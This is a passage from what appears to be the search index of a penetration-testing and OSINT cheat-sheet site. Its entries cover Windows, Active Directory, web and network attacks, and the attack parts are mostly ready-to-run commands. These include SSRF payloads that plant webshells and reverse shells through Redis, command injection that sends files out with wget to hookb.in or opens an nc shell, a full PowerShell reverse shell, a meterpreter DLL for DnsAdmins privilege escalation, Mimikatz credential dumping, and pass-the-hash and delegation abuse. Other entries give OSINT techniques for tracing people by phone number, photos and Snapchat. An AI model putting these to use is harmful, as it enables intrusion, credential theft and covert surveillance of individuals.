can be used to forge access to any service in the domain. mimikatz\u0026gt; kerberos::golden /user:Administrator /domain:testlab.local /sid:S-1-5-21-1516486103-3973840447-1748718438 /rc4:9063b8edb3d04ed734edd49e5b0adef3 /ptt"
},
{
	"uri": "/open-source-intelligence-osint/human-recon/pictures/",
	"title": "Picture Investigation",
	"tags": [],
	"description": "",
	"content": " General # Flickr Image search https://www.flickr.com/map \nReverse Image Search # Mutiple sources reverse image search https://www.duplichecker.com/reverse-image-search.php # General Engines https://images.google.com/ https://tineye.com/ https://www.bing.com/?scope=images\u0026amp;nr=1\u0026amp;FORM=NOFORM # Reverse Russia https://www.yandex.com/images/ # Reverse China http://images.baidu.com/ # Dedicated to faces # Results are not free but previews are available (used then on traditionnal engines) https://pimeyes.com/en/# If the classical method doesn\u0026#39;t give any result, for example for a logo # You can try to calculate the file hash (VT, Powershell, CyberChef...) # And then search for this hash on urlscan.io Get-FileHash -Algorithm SHA256 -Path \u0026#34;file path\u0026#34; \nImage Investigation https://medium.com/@raebaker/5-tools-to-detect-digitally-altered-images-719db4015b5d # EXIF and metadata http://exif.regex.info/exif.cgi # Basics Forensics https://fotoforensics.com/ # Text recognition (OCR) https://www.newocr.com/ # Stolen Camera Finder https://www.stolencamerafinder.com/ # Hate Symbols Database https://www.adl.org/hate-symbols # Check differences betweek images https://www.diffchecker.com/image-diff # Online tool to chekc if provided image have been edited # Take care because images are sent to the server and may be stored http://imageedited.com/ \nWorking with videos # Downloading videos from different platforms https://nixintel.info/linux/grabbing-videos-for-osint-how-to-use-youtube-dl/ $ youtube-dl https://www.youtube.com/watch?v=B9xE-40c2Oc $ youtube-dl https://twitter.com/i/status/1159811569045295104 $ youtube-dl -o ~/Videos/facebookvideo https://www.facebook.com/watch/?v=328211061465570# Getting frames and/or audio for a given video https://nixintel.info/osint-tools/using-ffmpeg-to-grab-stills-and-audio-for-osint/ # Getting frames ffmpeg -i myvideo.mp4 img%06d.png -hide_banner # Getting audio ffmpeg -i myvideo.mp4 -r 1 img%06d.png -hide_banner \nDeblurring images # Gaussian Blur # Install GIMP Plugin \u0026#34;G\u0026#39;MIC\u0026#34; # Filters\u0026gt;G’MIC\u0026gt;Details\u0026gt;Sharpen (Deblur)# Pixelize # The Pixelize blur works by dividing an image into a number of squares # and then replacing all the pixels in each square by average of their values. # For example, if a square has 7 black pixels and 7 white pixels, # all the pixels in that square will become gray. # - Start by applying Gaussian blur, increase radius until pixels disapear. # - Duplicate layers (Shift+Ctrl+D on Gimp) # - Filters\u0026gt;Edge detect\u0026gt;Image Gradient # - Colors\u0026gt;Brightness-Contrast and increase until refined edges # - Layers tab, \\/ icon and choose Soft Light, then adjust. # Not perfect results but can be ok and recognizable by search engines"
},
{
	"uri": "/windows-systems/post-exploitation-techniques/",
	"title": "Post Exploitation Techniques",
	"tags": [],
	"description": "",
	"content": "Check menu on the left for content . .;;............ .. .;;;;::::::::::::.. ':;;:::::::::::: . . ':  "
},
{
	"uri": "/linux-systems/programing-languages/",
	"title": "Programing Languages",
	"tags": [],
	"description": "",
	"content": "Check menu on the left for content . .;;............ .. .;;;;::::::::::::.. ':;;:::::::::::: . . ':  "
},
{
	"uri": "/web-pentest/injections/server-side-injections/ssrf/",
	"title": "Server Side Request Forgery (SSRF)",
	"tags": [],
	"description": "",
	"content": " https://vinc.top/2016/11/24/server-side-request-forgery https://github.com/allanlw/svg-cheatsheet \nPoC and enumeration # It is possible to prove the vulnerability by reading local files # Using the file protocol url=file:///etc/passwd # Then you can enumerate local services that are listening # Depending on the response http://localhost:\u0026lt;port\u0026gt; # It is also possible to use others protocols like gopher and dict # They don\u0026#39;t send HTTP headers and can avoid misinterpretation gopher://127.0.0.1:6379/test # Filter bypass http://127.1 instead of http://127.0.0.1 http://0 instead of http://localhost http://0xC0A80001 or http://3232235521 =\u0026gt; 192.168.0.1 192.168.516 =\u0026gt; 192.168.2.4 \nRedis Exploitation # Redis is a database system that stores everything in RAM # Getting a webshell url=dict://127.0.0.1:6379/CONFIG%20SET%20dir%20/var/www/html url=dict://127.0.0.1:6379/CONFIG%20SET%20dbfilename%20file.php url=dict://127.0.0.1:6379/SET%20mykey%20\u0026#34;\u0026lt;\\x3Fphp system($_GET[0])\\x3F\u0026gt;\u0026#34; url=dict://127.0.0.1:6379/SAVE# Getting a reverse shell gopher://127.0.0.1:6379/_config%20set%20dir%20%2Fvar%2Fwww%2Fhtml gopher://127.0.0.1:6379/_config%20set%20dbfilename%20reverse.php gopher://127.0.0.1:6379/_set%20payload%20%22%3C%3Fphp%20shell_exec%28%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FREMOTE_IP%2FREMOTE_PORT%200%3E%261%27%29%3B%3F%3E%22 gopher://127.0.0.1:6379/_save nc -lvp \u0026lt;port\u0026gt; http://site.org/reverse.php# Priv. Esc. using SSH key ssh-keygen url=dict://127.0.0.1:6379/SET%20mykey%20\u0026#34;\\n\\nCLE_PUB_RSA_ICI\\n\\n\u0026#34; url=dict://127.0.0.1:6379/CONFIG%20SET%20dir%20/root/.ssh url=dict://127.0.0.1:6379/CONFIG%20SET%20dbfilename%20authorized_keys url=dict://127.0.0.1:6379/SAVE ssh -i id_rsa root@host.org # You can use dict protocol and crontab # - You set the working directory # - Update the redis database location # - Listening # - Write a reverse shell payload # - Save it dict ://127.0.0.1:6379/config set dir /var/spool/cron/ dict ://127.0.0.1:6379/config set dbfilename root nc -lvp \u0026lt;port\u0026gt; dict ://127.0.0.1:6379/set -.- \u0026#34;\\n\\n\\n* * * * * bash -i \u0026gt;\\x26 /dev/tcp/\u0026#34;ip\u0026#34;/\u0026#34;port\u0026#34; 0\u0026gt;\\x261\\n\\n\\n\u0026#34; dict ://127.0.0.1:6379/save # You can also use the gopher protocol (replace IP and port) url=gopher%3A//127.0.0.1%3A6379/_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252462%250D%250A%250A%250A%252A/1%2520%252A%2520%252A%2520%252A%2520%252A%2520bash%2520-i%2520%253E%2526%2520/dev/tcp/xxx.xxx.xxx.xxx/3615%25200%253E%25261%250A%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252416%250D%250A/var/spool/cron/%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25244%250D%250Aroot%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A"
},
{
	"uri": "/web-pentest/php-vulnerabilities/tricks_others/",
	"title": "Tricks &amp; Others",
	"tags": [],
	"description": "",
	"content": " Code auditing / Looking for vulnerabilities https://github.com/dustyfresh/PHP-vulnerability-audit-cheatsheet \nBypass PHP disable_functions and open_basedir # PHP in Linux calls a binary (sendmail) when the mail() function is executed. # If we have putenv() allowed, we can set the environment variable \u0026#34;LD_PRELOAD\u0026#34;, so we can # preload an arbitrary shared object. Our shared object will execute our custom # payload (a binary or a bash script) without the PHP restrictions, so we can have a reverse shell, for example. # Chankro tool is used for that (https://github.com/TarlogicSecurity/Chankro) python2 chankro.py --arch 64 --input rev.sh --output chan.php --path /var/www/html \nMISC # Path truncation # PHP max path is 4096 char # It is possible to bypass checks for one file, for example, by flooding the path before requesting a resource page=././././././././....... # There is a BIG difference between “$salt” and ‘$salt’. # Double quotes → interpreted as a variable # Simple quotes → interpreted as a string \nRegister Globals index.php ?_SESSION[logged]=1"
},
{
	"uri": "/windows-systems/",
	"title": "Windows Systems",
	"tags": [],
	"description": "",
	"content": "Check menu on the left for content . .;;............ .. .;;;;::::::::::::.. ':;;:::::::::::: . . ':  "
},
{
	"uri": "/network/services-enumeration/110_pop3/",
	"title": "110 - POP3",
	"tags": [],
	"description": "",
	"content": " Identification and Scans # Retrieve POP3 server capabilities (CAPA, TOP, USER, SASL, RESP-CODES, LOGIN-DELAY, PIPELINING, EXPIRE, UIDL, IMPLEMENTATION) nmap -v -sV --version-intensity=5 --script pop3-capabilities -p T:110 IP # Try to bruteforce POP3 accounts nmap --script pop3-brute --script-args pop3loginmethod=SASL-LOGIN -p T:110 IP nmap --script pop3-brute --script-args pop3loginmethod=SASL-CRAM-MD5 -p T:110 IP nmap --script pop3-brute --script-args pop3loginmethod=APOP -p T:110 IP \nBanner grabbing/checking # Using netcat nc \u0026lt;IP\u0026gt; 110 # Using telnet telnet \u0026lt;IP\u0026gt; 110 \nAuthentication Checking (classical credentials) USER admin PASS admin USER root PASS root USER root PASS toor # Once logged list"
},
{
	"uri": "/windows-systems/privilege-escalation/dnsadmins_group/",
	"title": "DNSadmins group",
	"tags": [],
	"description": "",
	"content": "# If you control any account member of the \u0026#34;DnsAdmin\u0026#34; group # You can use it to privesc on the machine # It works by adding a malicious DLL loaded by the DNS service. # You have to restart the service and the DLL will be loaded as SYSTEM# Generating the DLL $ sudo msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.28 LPORT=5566 -f dll \u0026gt; privesc.dll # Host the DLL on a SMD server or upload it on the target machine $ sudo smbserver.py MYSHARE /path/to/dll -smb2support # On the target machine, update the DNS configuration and give it the DLL PS \u0026gt; dnscmd 10.10.10.169 /config /serverlevelplugindll \\\\10.10.14.28\\TESTLOL\\privesc.dll # You can check if the DLL has been correctly loaded PS \u0026gt; Get-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Services\\DNS\\Parameters\\ -Name ServerLevelPluginDll # Then restart the DNS service PS \u0026gt; sc.exe stop dns PS \u0026gt; sc.exe query dns PS \u0026gt; sc.exe start dns # If the exploit worked you should get a meterpreter"
},
{
	"uri": "/open-source-intelligence-osint/tools-and-methodology/frameworks-automated/danger_zone/",
	"title": "Danger Zone",
	"tags": [],
	"description": "",
	"content": " General Informations https://github.com/woj-ciech/Danger-zone ⇒ HORRIBLE SETUP #FuckingGoogleSearchApiModule # Correlate data between domains, ips and email addresses, present it as a graph # And store everything into Elasticsearch and JSON files # You have to edit the settings.json file in order to provide your API keys and Elestic database info # Golden Rule → Don\u0026#39;t jump to conclusions too fast \nUsage python danger-zone.py -h usage: dangerzone.py [-h] [--email EMAIL] [--address ADDRESS] [--domain DOMAIN] [--elasticsearch] Correlate data between domains, ips and email addresses and present it as a graph. optional arguments: -h, --help show this help message and exit --email EMAIL Email address --address ADDRESS IP address --domain DOMAIN Domain name --elasticsearch Elasticsearch output # Example domain check python danger-zone.py --domain example.net --elastic \nModules - Email → Trumail - Validation email address (https://trumail.io/) → Whoxy - Reverse Whois service (https://whoxy.com/) KEY NEEDED → haveIbeenPwned - Dumps (https://haveibeenpwned.com/) → Username check - Check username, based on email address, across social media sites (https://username-availability.herokuapp.com/) → Google - Query Google - IP → Geolocation - Geolocate IP (https://extreme-ip-lookup.com/) → Threatcrowd - Information about IP (https://github.com/AlienVault-OTX/ApiV2) → VirusTotal - Information about IP (https://www.virustotal.com/) Key needed - Domain → TLD - Get sponsor of particular Top Level Domain (https://raw.githubusercontent.com/mikewesthad/tld-data/master/data/tlds.json) → Threatcrowd - Information about domain (https://github.com/AlienVault-OTX/ApiV2) → Whoxy - Whois service (https://whoxy.com/) → Whois history - Historical data about domain (https://whoxy.com/) → Wayback Machine - Archive version of website (http://archive.org/) → VirusTotal - Information about domain (https://www.virustotal.com/)"
},
{
	"uri": "/web-pentest/injections/headers_injections/",
	"title": "Headers Injections",
	"tags": [],
	"description": "",
	"content": " Security Headers HTTP Strict Transport Security (HSTS) --- Force HTTPS if enabled on the website Content Security Policy (CSP) --- Restrict/Whitelist some resources for some users X-XSS-Protection --- Protection for XSS X-Frame-Options --- Protect from clickjacking by removing iframes X-Content-Type-Options --- Protect from MIME sniffing # Cookie Set-Cookie Secure --- Prevent cookie stealing during transport Set-Cookie HttpOnly --- Prevent cookie stealing in the web browser Set-Cookie SameSite --- Prevent from CSRF (cookies will stay on the website)  \nInteresting Headers Some interesting header to fuzz the application with: Host: 127.0.0.1 X-Forwarded-For: 127.0.0.1 X-Forwarded-Host: 127.0.0.1 X-Forwarded-Server: 127.0.0.1 Location: 127.0.0.1 ProxySourceAddress: 127.0.0.1  \nTRACE/TRACK Method # You can get information using the TRACE method # If your requests goes through a WAF, you might have some informations in the response # Added headers (X-Forwarded-For) for example → You can try to bypass the WAF # Bypass WAF by addind it's own IP in the header and tell him to ignore the request  \nXST - Cross Site Tracing # Client side vulnerability using TRACE Method # It's not about injecting executable Javascript as long as the client must already be able to execute # It takes advantage of the fact that the web server reflect the client's HTTP message in his response # The main goal is to access headers that are blocked by JavaScript  "
},
{
	"uri": "/other-systems/kubernetes/",
	"title": "Kubernetes",
	"tags": [],
	"description": "",
	"content": " Resources https://book.hacktricks.xyz/pentesting/pentesting-kubernetes \n"
},
{
	"uri": "/linux-systems/",
	"title": "Linux Systems",
	"tags": [],
	"description": "",
	"content": "Check menu on the left for content . .;;............ .. .;;;;::::::::::::.. ':;;:::::::::::: . . ':  "
},
{
	"uri": "/web-pentest/content-management-system-cms/others/",
	"title": "MISC &amp; Others",
	"tags": [],
	"description": "",
	"content": " CMSimple # CMSimple LFI index.php ?sl=../adm\u0026amp;file=config\u0026amp;action=download\u0026amp;adm=1 \nNanoCMS # Password and sensitive data leak [url]/data/pagesdata.txt"
},
{
	"uri": "/web-pentest/injections/server-side-injections/os/",
	"title": "OS Command Injections",
	"tags": [],
	"description": "",
	"content": " Command Injection # Command Injection blablabla ; ls # Bypass filters - syntax error \u0026#39;\u0026#39; OK \u0026#39;127.0.0.1\u0026#39; OK () syntax error `ls` syntax error (car ` filtré donc `ls` =\u0026gt; ls) `;` OK 127.|0.0.1 OK =\u0026gt; | filtré 127.0.\u0026amp;0.1 OK =\u0026gt; \u0026amp; filtré 127.0.;0.1 OK =\u0026gt; ; filtré 127.0.$0.1 OK =\u0026gt; $ filtré 127.0.`0.1 OK =\u0026gt; ` filtré 127.0.``0.1 OK =\u0026gt; ` filtré 127.0.\u0026#39;0.1 syntax error =\u0026gt; \u0026#39; pas filtré 127.0.\u0026#39;\u0026#39;0.1 OK =\u0026gt; \u0026#39;\u0026#39; string vide donc sans effet 192.198.169.198 NOK 127.0.0.1 127.0.0.1 NOK =\u0026gt; comme sur un host normal, donc espaces acceptés 127 .0.0.1 syntax error =\u0026gt; confirme espace OK #127.0.0.1 syntax error 127.0.0.1 #127.0.0.1 OK =\u0026gt; # pas filtré 127.0.0.1 -L OK 127.0.0.1 -c 1 syntax error 127.0.0.1 -i 10 OK, long time (\u0026gt;20s) donc argument pris en compte 127.0.0.1%0asleep 20 longue attente (20s + ~3), donc commande probablement exécutée après # You can then use wget and --post-file option to exfiltrate data 127.0.0.1%0awget%20--post-file%20index.php%20https://hookb.in/xxxxxx # Or you can use nc to get a reverse shell nc -lvvp 4444 curl \u0026lt;target/index.php\u0026gt; --data \u0026#39;ip=`www.google.fr%0anc.traditional MON_IP 4444 -e /bin/bash`\u0026#39;# If some char are filtered you can play with argument reuse ?args=%0A\u0026amp;args=c:at\u0026amp;args=/etc/passwd ?args[]=%0A\u0026amp;args[]=c:at\u0026amp;args[]=/etc/passwd ?\u0026amp;args[]=cat\u0026amp;args[]=/etc/passwd \n"
},
{
	"uri": "/web-pentest/php-vulnerabilities/",
	"title": "PHP Vulnerabilities",
	"tags": [],
	"description": "",
	"content": "Check menu on the left for content . .;;............ .. .;;;;::::::::::::.. ':;;:::::::::::: . . ':  "
},
{
	"uri": "/open-source-intelligence-osint/human-recon/phone/",
	"title": "Phone",
	"tags": [],
	"description": "",
	"content": " Using phone contact book apps https://www.bellingcat.com/resources/how-tos/2019/04/08/using-phone-contact-book-apps-for-digital-research/ # GetContact # Free, need SMS requirement (burner) + email # Banned in some countries but works good # List one possible name # TrueCaller # Free, need Google or Microsoft account # Works good, list one possible name and tags # CallApp # Free, need Google or Microsoft account OR SMS # Works good, lists comments from users about number, gives a # reliability score to number, shows how often the number was searched # Dalily # No requirements, free # Focused only on Arabic-speaking countries # Can search by either name or number, and also will provide all contact book # information (email, etc), not just name and number # Eyecon # Free, SMS requirement # Photograph and one name for the contact # Viewcaller / Showcaller # No requirements, free # Only one name, very basic details \nPhone number verification and validation # The International Numbering Plans gives a nice database to find the country https://www.numberingplans.com/?page=analysis\u0026amp;sub=phonenr # Numverify can help to find informations about a number # API https://numverify.com/# HLR Lookups # A central database that contains details of each mobile phone subscriber that is authorized # to use the GSM Core Network # It can be used to know # - If a mobile number exist # - If it can receive calls or messages # You can use providers to make HLR requests # Not free! but cheap (like 0.010EUR per lookup) https://www.hlr-lookups.com/ https://www.hlrlookup.com/ \nIgnorant https://github.com/megadose/ignorant # ignorant does not alert the target phone number # ignorant allows you to check if a phone number is used on different sites like snapchat, instagram. ignorant 33 644637111 # Modules (atm) : # - Amazon # - Instagram # - Snapchat \nGetting informations using a phone number # When you have a phone number, you can use some messaging websites/applications # If the target is registered, it can provides additional informations # /!\\ Some applications might tell the target you\u0026#39;ve reached them /!\\ https://medium.com/@Ginger_T/how-can-we-use-messenger-apps-in-osint-682cbc634f Facebook Messenger # Profile picture and details from Facebook bio Facetime # If you add a contact on Apple it wil tell you if the target can use Facetime # If so, you know the target is using an Apple Product ICQ # Profile Picture, Nickname, Name, BIO \u0026amp; last seen. # Will show when someone is on-line. Skype # Display, username, profile picture. # It will provide the name as per the server not your contacts # Also location information of where they say they are from along with a date of birth. Telegram # User\u0026#39;s profile photo, username and bio # From the desktop app, you can see previous photos Strava # Profile picture and the name on Strava server not in your contacts. # Will also show the location they are from if this field has been completed and Bio info. WhatsApp # Profile picture, last seen, status and about me"
},
{
	"uri": "/open-source-intelligence-osint/platforms-hunting/",
	"title": "Platforms Hunting",
	"tags": [],
	"description": "",
	"content": "Check menu on the left for content . .;;............ .. .;;;;::::::::::::.. ':;;:::::::::::: . . ':  "
},
{
	"uri": "/windows-systems/exploitation/rdp_exploitation/",
	"title": "RDP Exploitation",
	"tags": [],
	"description": "",
	"content": " Remote and Auto # Remotely enable RDP using CrackMapExec sudo crackmapexec smb 10.69.88.23 -u user -p password -M rdp -o ACTION=enable# RDP through Pass-the-Hash xfreerdp /u:USER /d:DOMAIN /pth:NTLM /v:server.domain.local # RDP using mimikatz and PtH sekurlsa::pth /user:user /domain:domain.local /ntlm:xxxxxxxxxxxxxxx /run:\u0026#34;mstsc.exe /restrictedadmin\u0026#34; \ncmd.exe # Enable RDP from cmd.exe reg add \u0026#34;HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\u0026#34; /v fDenyTSConnections /t REG_DWORD /d 0 /f # Disable RDP from cmd.exe reg add \u0026#34;HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\u0026#34; /v fDenyTSConnections /t REG_DWORD /d 1 /f # Disable NLA (Network Layer Authentication) requirement reg add \u0026#34;HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\u0026#34; /v UserAuthentication /t REG_DWORD /d 0 /f # You can also do it through the firewall netsh firewall set service remoteadmin enable netsh firewall set service remotedesktop enable \nPowershell # Requires admin privileges or being able to run as sudo (using powershell sudo.ps1) powershell -ExecutionPolicy ByPass -command \u0026#34;\u0026amp; { . C:\\Users\\Username\\AppData\\Local\\Temp\\sudo_PS1-0.ps1; }\u0026#34; \nMan in The Middle \n# You can try to attack existing RDP connections # seth.sh is a great tool for that # It performs an ARP spoofing attack ./seth.sh eth0 \u0026lt;IP attacker\u0026gt; \u0026lt;IP victim\u0026gt; \u0026lt;Gateway | Host\u0026gt;"
},
{
	"uri": "/open-source-intelligence-osint/platforms-hunting/snapchat/",
	"title": "Snapchat",
	"tags": [],
	"description": "",
	"content": " # Snapchat guide for law enforcment https://storage.googleapis.com/snap-inc/privacy/lawenforcement.pdf Online Research Tools # Online browser # Potentially NSFW https://sovip.io # User Search https://www.snapdex.com/ https://snapyfox.com/ # Location https://map.snapchat.com/ Snapchat Map https://osintcurio.us/2020/04/13/using-snapchat-for-osint-10-minute-tip/ # Using the map you can view public content # You can play with overlays and save videos # To get video # - Developper Tools (F12) # - Network and filter on medias # - Reload (Ctrl+R) # - On the snap link, right click and open in new tab # By default it removes extra graphics layer https://s.sc-cdn.net/\u0026lt;some random string\u0026gt;/default/media.mp4 # You can get original video by tweaking media.mp4 to embedded.mp4 https://s.sc-cdn.net/\u0026lt;some random string\u0026gt;/default/embedded.mp4# Scraper for the snapcat map https://github.com/nemec/snapchat-map-scraper # Create the db $ python3 story_downloader.py create snap.db # Add locations # Added downtown dallas to database $ python3 story_downloader.py add --database snap.db --label \u0026#34;downtown dallas\u0026#34; 32.783038 -96.796388 # The scrape command iterates through all of the added locations and downloads snaps at that location # --randomize will randomize the geo location within 500m, intended to prompt Snapchat\u0026#39;s API to # send new videos that it hasn\u0026#39;t yet served. # --repeat will cause the application to loop infinitely looking for new videos. # Leave it running overnight to collect as much as possible. # --sleep will modify how long the application sleeps before repeating. # Defaults to 120 seconds and only takes effect if --repeat is included $ python3 story_downloader.py scrape --database snap.db --randomize --repeat # The review command looks through all unreviewed videos and opens each one in a video player for review $ python3 story_downloader.py review --database snap.db # The export command will copy all videos which are \u0026#34;classified\u0026#34; to a new folder for further review/editing/publishing. $ python3 story_downloader.py export --database snap.db export/ \nSnapchat Stories # You can get Snapchat stories https://story.snapchat.com/ # Each user story URL is like that https://story.snapchat.com/s/username # If a user\u0026#39;s settings are public content, you can try # For downloading, same as for the map # - Developper Tools (F12) # - Network and filter on medias # - Reload (Ctrl+R) # - On the snap link, right click and open in new tab"
},
{
	"uri": "/shells-methods/windows/",
	"title": "Windows Shells Methods",
	"tags": [],
	"description": "",
	"content": " Powershell # Powershell reverse shell # Scheduled task for example # powershell -enc \u0026lt;base 64 de la commande\u0026gt; $client = New-Object System.Net.Sockets.TCPClient(\u0026#34;10.0.20.12\u0026#34;,443);$stream = $client.GetStream();\\ [byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;\\ $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);\\ $sendback = (iex $data 2\u0026gt;\u0026amp;1 | Out-String );$sendback2 = $sendback + \u0026#34;PS \u0026#34; + (pwd).Path + \u0026#34;\u0026gt; \u0026#34;;\\ $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);\\ $stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close() WMIexec # wmiexec is less noisy than psexec /usr/bin/impacket-wmiexec d.traya@192.168.56.102  psexec # psexec # Drosp a binary on the target → Noisy /usr/share/doc/python-impacket/examples/psexec.py GALACTIC/d.traya:triumvirat@192.168.56.102  smbexec # smbexec /usr/share/doc/python-impacket/examples/smbexec.py GALACTIC/d.traya:triumvirat@192.168.56.102  \nMimikatz in RAM # From MSF (execute Mimikatz in RAM) execute -H -i -c -m -d calc.exe -f /path/to/mimikatz.exe -a '\u0026quot;privilege::debug\u0026quot; \u0026quot;sekurlsa::logonPasswords full\u0026quot; exit'  \nMetasploit # psexec msf5 \u0026gt; use exploit/windows/smb/psexec msf5 exploit(windows/smb/psexec) \u0026gt; set RHOSTS 10.69.88.100 msf5 exploit(windows/smb/psexec) \u0026gt; set SMBDomain GALACTIC.LAN msf5 exploit(windows/smb/psexec) \u0026gt; set SMBUSER d.traya msf5 exploit(windows/smb/psexec) \u0026gt; set SMBPASS triumvirat msf5 exploit(windows/smb/psexec) \u0026gt; run # Impersonate user use incognito list_tokens -u impersonate_token \u0026lt;token\u0026gt; shell whoami"
},
{
	"uri": "/network/services-enumeration/119_nntp/",
	"title": "119 - NTP",
	"tags": [],
	"description": "",
	"content": " Banner Grabbing # Using telnet telnet IP 119 # Using netcat nc -nv IP 119 LIST \nIdentification and manual test # Using netcat nc -nv IP 119 LIST GROUP group_name to display related messages POST From; test@knacki.fr Newsgroups: group_name Subject: Test This is a test. . HEAD identity_article ARTICLE identity_article BODY identity_article"
},
{
	"uri": "/windows-systems/privilege-escalation/delegations/",
	"title": "Active Directory Delegations",
	"tags": [],
	"description": "",
	"content": " Unconstrained Delegation # Nice resource for user account =/= machine account in UC http://blog.redxorblue.com/2019/12/no-shells-required-using-impacket-to.html # AD Objects having Unconstrained Delegation issues have the TRUSTED_FOR_DELEGATION flag set # You can search for users using Pywerview $ python pywerview.py get-netuser -u ownedUser -p userPassword -d foo.lan -t dc1.foo.lan --unconstrained # You can also request through ldapdomain dump and then grep for interesting $ ldapdomaindump -u \u0026#34;foo.lan\\\\ownedUser\u0026#34; -p \u0026#34;userPassword\u0026#34; 192.168.30.10 $ grep TRUSTED_FOR_DELEGATION *.grep # Using Powershell and the ADModule (https://github.com/samratashok/ADModule) Get-ADComputer -Filter {TrustedForDelegation -eq $True}# Compromised User having Unconstrained Delegation # 1/ Add a fake SPN using the pwnedUser $ python addspn.py -u foo.lan\\\\ownedUser -p userPassword -s host/PWNED.foo.lan ldap://dc1.foo.lan # 2/ Create a new DNS record pointing the fake SPN to our attacking IP $ python dnstool.py -u foo.lan\\\\ownedUser -p userPassword -r PWNED.foo.lan -a add -d \u0026lt;attacker-IP\u0026gt; DC1.foo.lan # 3/ In one shell, start krbrelayx (salt is case sensitive!) $ sudo python krbrelayx.py --krbsalt foo.lanownedUser --krbpass userPassword # 4/ In another shell $ python printerbug.py foo.lan/ownedUser:userPassword@DC1.foo.lan PWNED.foo.lan # It will force the target DC to connect to our fake new \u0026#34;computer\u0026#34; configured through # Unconstrained Delegation. It will then embed a copy of the DC$ TGT, being saved by krbrelayx. # Then... export KRB5CCNAME=/path/to/ticket.ccache $ python secretsdump.py -k DC1.foo.lan -just-dc # Compromised Machine/Server having Unconstrained Delegation # If you compromised a machine having UC you can use it to get a copy of the DC\u0026#39;s TGT # In Powershell you can check for the spoolss presence PS\u0026gt; ls \\\\\u0026lt;dc-ip\u0026gt;\\pipe\\spoolss # On the compromised machine, start monitoring with Rubeus Rubeus.exe monitor /interval:1 # Then using the SpoolSample PoC (https://github.com/leechristensen/SpoolSample) # You can force the DC to connect to the owned machine # Delegation being set, you will get a copy of the DC$ TGT in Rubeus .\\SpoolSample.exe VICTIM-DC-NAME UNCONSTRAINED-SERVER-DC-NAME \nConstrained Delegation # AD Objects having Unconstrained Delegation issues have the TRUSTED_TO_AUTH_FOR_DELEGATION flag set # The msDS-AllowedToDelegateTo indicates objects involded in the delegation rights # The goal is to get a ticket for an impseronated user on a service we have delegation rights to getST.py -spn SERVICE/HOSTNAME_YOU_HAVE_DELEGATION_RIGHTS_TO.FQDN -impersonate TARGET_USER DOMAIN/USERNAME:PASSWORD # It is then possible to modify the service name portion of the ticket (not encrypted) # Impackets auto update the sname in backend # The following posts describes this behavior https://www.secureauth.com/blog/kerberos-delegation-spns-and-more # Once the ticket have been generated, we can then use it export KRB5CCNAME=/path/to/ticket.ccache $ python secretsdump.py -k DC1.foo.lan -just-dc  \nRBCD Exploitation https://github.com/aas-n/leHACK19 # Microsoft is releasing an update in March 2020 that will enable LDAP channel binding \u0026amp; LDAP # signing by default on Windows systems, remediating this potential attack vector on fully patched systems. # When to use : # Basically, when you’re on a network and want to get a shell on a different system on that same network segment. # This attack can be ran without needing any prior credentials. # However, the method described does require that a domain controller in the environment is configured with LDAPS.# From Windows Hosts # Importing Powerview and Powermad Import-Module .\\Powerview.ps1 Import-Module .\\Powermad.ps1 # Authentication $TargetComputer = \u0026#34;DC01.domain.lan\u0026#34; $SecPassword = ConvertTo-SecureString \u0026#39;passw0rd\u0026#39; -AsPlainText -Force $Cred = New-Object System.Management.Automation.PSCredential(\u0026#39;DOMAIN\\ControlledAccount\u0026#39;, $SecPassword) # Get our user\u0026#39;s SID $AttackerSID = Get-DomainUser ControlledUser -Credential $Cred -Server 10.10.10.10 -Properties objectsid | Select -Expand objectsid $ACE = Get-DomainObjectACL $TargetComputer -Credential $Cred -Server 10.10.10.10 | ?{$_.SecurityIdentifier -match $AttackerSID} # Adding a machine and getting SID New-MachineAccount -Credential $Cred -Domain domain.lan -DomainController 10.10.10.10 -MachineAccount lleXXXXX -Password $(ConvertTo-SecureString \u0026#39;passw0rd\u0026#39; -AsPlainText -Force) $ComputerSID = Get-DomainComputer lleXXXXX -Credential $Cred -Server 10.10.10.10 -Properties objectsid | Select -Expand objectsid # Creating structure to store in Allowedtoact in the DC $SD= New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList \u0026#34;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSID))\u0026#34; $SDBytes = New-Object byte[] ($SD.BinaryLength) $SD.GetBinaryForm($SDBytes, 0) # Rewrite Allowedtoact properties on the DC Get-DomainComputer $TargetComputer -Credential $Cred -Server 10.10.10.10 | Set-DomainObject -Credential $Cred -Server 10.10.10.10 -Set @{\u0026#39;msds-allowedtoactonbehalfofotheridentity\u0026#39;=$SDBytes} # Now you can impersonate the domain admin account on the DC using the machine account .\\Rubeus.exe hash /password:passw0rd /user:lleXXXXX /domain:domain.lan .\\Rubeus.exe s4u /user:lleXXXXX$ /rc4:\u0026lt;hash\u0026gt; /impersonateuser:Administrator /msdsspn:ldap/DC01.domain.lan /ptt /dc:10.10.10.10 /domain:domain.lan .\\Rubeus.exe klist # Then, you can get the NTLM hash of domain admin using DCSync and Mimikatz .\\Mimikatz.exe mimikatz\u0026gt; lsadump::dcsync /user:domain\\Adminisrator /domain:domain.lan /dc:DC01.domain.lan# From Linux Hosts # First step is creating a computer account in order to have control on a computer account with SPNs addcomputer.py -method SAMR -computer-pass MADE_UP_PASSWORD -computer-name MADE_UP_NAME 